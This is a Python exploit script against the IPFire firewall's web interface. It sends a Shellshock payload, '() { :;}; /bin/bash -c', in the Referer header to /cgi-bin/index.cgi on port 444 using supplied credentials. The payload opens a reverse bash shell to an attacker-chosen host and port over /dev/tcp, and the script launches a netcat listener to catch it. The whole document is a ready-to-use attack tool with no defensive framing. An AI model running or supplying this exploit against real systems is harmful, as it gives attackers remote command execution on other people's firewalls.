import requests
import base64
import sys
from urllib3.exceptions import InsecureRequestWarning
from optparse import OptionParser
from multiprocessing.dummy import Pool
import subprocess

class burn(): 
  def __init__(self, options): 
    self.target = options.target 
    self.user = options.user
    self.pwd = options.pwd
    self.lhost = options.lhost  
    self.lport = options.lport  

    print("\r\n[+] (m4ud) ShellShock IPFire to Shell! [+]\r\n")
    shell = "sleep 3;bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, self.lport)
    auth = self.user + ":" + self.pwd

    auth = base64.b64encode(bytes(auth, encoding='utf-8')).decode('utf-8')
    auth = "Basic " + auth

    ShellShock = "() { :;}; /bin/bash -c " + '"' + shell + '"'
    global headers
    headers = { "Authorization": auth, "Referer": ShellShock }

    global url
    url = "https://" + self.target + ":444/cgi-bin/index.cgi"
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    print("[+] Throwing a water bucket in IPFire!  [+]")
    print("[*] Get Shell, check your netcat listener! [*]")
#    r = requests.get(url, headers=headers, verify=False)
    pool = Pool(2)   
    for i in range(1):
      pool.apply_async(pool.apply_async(self.req()))

      pool.apply_async(pool.apply_async(self.getshell()))
  def req(self):
      try:
          r = requests.get(url, headers=headers, verify=False, timeout=1.0)
      except requests.exceptions.ReadTimeout:
          pass
  def getshell(self):
    print("[*] Ooh boy, here it comes the Shell! [*]\r\n")
    nc = subprocess.run('nc -nlvp ' + str(self.lport), shell=True)
def main():
#  exploit = burn()
  parser = OptionParser()  
    
  parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")  
  parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT")  
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Requeired ] LHOST")  
  parser.add_option("-u", dest="user",default=443, help="Username")
  parser.add_option("-P", dest="pwd", help="PWD") 
  (options, args) = parser.parse_args()  
  if options.target:  
    exploit = burn(options)
  else: 
    parser.print_help()

if __name__=="__main__":
    main()

